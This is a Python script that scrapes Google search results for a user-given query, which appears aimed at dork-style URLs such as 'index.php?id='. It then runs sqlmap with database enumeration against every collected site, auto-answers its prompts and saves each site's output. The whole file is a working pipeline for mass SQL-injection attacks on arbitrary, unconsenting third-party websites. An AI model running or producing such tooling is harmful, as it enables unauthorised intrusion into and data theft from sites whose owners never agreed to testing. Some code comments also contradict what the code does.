import requests
import concurrent.futures
from bs4 import BeautifulSoup
import lxml
import requests_cache
import urllib.parse
import os
import subprocess
def extract_url(link):
    """
    Extracts URLs from Google search result links.
    """
    href = link.get("href")
    if href.startswith("/url?q="):
        url = href.split("/url?q=")[1].split("&")[0]
        if "https://support.google.com/" in url or "https://accounts.google.com/" in url:
            return None
        if any(word in url for word in ["facebook", "reddit", "stackoverflow", "google", "youtube"]):
            return None
        # Remove URL encoding
        url = urllib.parse.unquote(url)
        if "/search?q=/index.php?id%3D&ie=UTF-8&filter=0"==url:
            return None
        return url
    return None

def get_urls(search_query, num_results):
    """
    Performs a Google search and returns a list of URLs.
    """
    # Calculate the number of pages to navigate to based on the desired number of results
    num_pages = (num_results + 9) // 10

    # Enable caching of HTTP responses to avoid unnecessary requests
    requests_cache.install_cache("google_cache", expire_after=3600)

    # Construct the Google search URLs with the search query and number of results parameters
    urls = []
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        with requests.Session() as session:
            for i in range(num_pages):
                start = i * 10
                url = f"https://www.google.com/search?q={search_query}&num=10&start={start}"
                futures.append(executor.submit(session.get, url))

            for future in concurrent.futures.as_completed(futures):
                response = future.result()
                soup = BeautifulSoup(response.content, "lxml")
                links = soup.find_all("a")
                page_urls = [extract_url(link) for link in links]
                page_urls = list(filter(None, page_urls))
                urls += page_urls

                if len(urls) >= num_results:
                    break

    return urls[:num_results]

def save_urls(output_file_name, urls):
    """
    Saves a list of URLs to a file.
    """
    with open(output_file_name, "w") as output_file:
        for url in urls:
            output_file.write(url + "\n")

    return os.path.abspath(output_file_name)

def save_to_file():
    """
    Main function to execute the program.
    """
    # Take the user inputs
    search_query = input("Enter the search query: ")
    num_results = int(input("Enter the number of results to save: "))
    output_file_name = input("Enter the output file name: ")

    # Get the URLs
    urls = get_urls(search_query, num_results)

    # Save the URLs to the output file
    output_file_path = save_urls(output_file_name, urls)

    # Print a message to indicate that the program has finished
    print(f"{len(urls)} URLs saved to {output_file_name}!")
    print(f"File path: {output_file_path}")
    return output_file_path
def main():
    output_file_path=save_to_file()
    run_sqlmap(output_file_path)
def get_file_path(output_file_path):
    return output_file_path

def test_all_links():
    return input("Do you want to test all the links in the file? (y/n): ").lower() == 'y'

def get_single_link(file_path):
    with open(file_path, "r") as file:
        links = file.readlines()
    print("Select a link to test:")
    for i, link in enumerate(links):
        print(f"{i + 1}. {link.strip()}")
    choice = int(input()) - 1
    return [links[choice].strip()]

def get_links(output_file_path):
    file_path = get_file_path(output_file_path)
    test_all = test_all_links()
    if test_all:
        with open(file_path, "r") as file:
            links = file.readlines()
        return [link.strip() for link in links]
    else:
        return get_single_link(file_path)

def get_folder_name():
    return input("Enter the name of the folder to save the text files in: ")

def create_folder(folder_name):
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

def get_additional_options():
    return input("Enter additional sqlmap options (e.g. -D, -T): ")

def execute_sqlmap(link, additional_options):
    # execute the sqlmap command on the link
    command = ["sqlmap", "-u", link.strip(), "-dbs"] + additional_options.split()
    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

    # interactively communicate with the process and send input with uppercase letters
    output = b''
    while True:
        # read the process output and print it
        line = process.stdout.readline()
        if not line:
            break
        output += line
        print(line.decode(), end='')

        # check if the process is waiting for input
        if b' [y/N/q]' in line:
            # send uppercase 'N' as input
            process.stdin.write(b'N\n')
            process.stdin.flush()
        if b' [Y/n/q]' in line:
            # send uppercase 'N' as input
            process.stdin.write(b'Y\n')
            process.stdin.flush()
        if b' [y/n/Q]' in line:
            # send uppercase 'N' as input
            process.stdin.write(b'Q\n')
            process.stdin.flush()
    process.wait()
    return output

def get_website_name(link):
    return link.strip().split('/')[2].split('.')[-2]

def create_website_folder(folder_name, website_name):
    website_folder = os.path.join(folder_name, website_name)
    if not os.path.exists(website_folder):
        os.makedirs(website_folder)

def save_output(output, folder_name, website_name):
    filename = os.path.join(folder_name, website_name, "output.txt")
    with open(filename, "wb") as text_file:
        text_file.write(output)

def run_sqlmap(output_file_path):
    links = get_links(output_file_path)
    folder_name = get_folder_name()
    create_folder(folder_name)
    additional_options = get_additional_options()
    for link in links:
        output = execute_sqlmap(link, additional_options)
        website_name = get_website_name(link)
        create_website_folder(folder_name, website_name)
        save_output(output, folder_name, website_name)

if __name__ == "__main__":
    main()

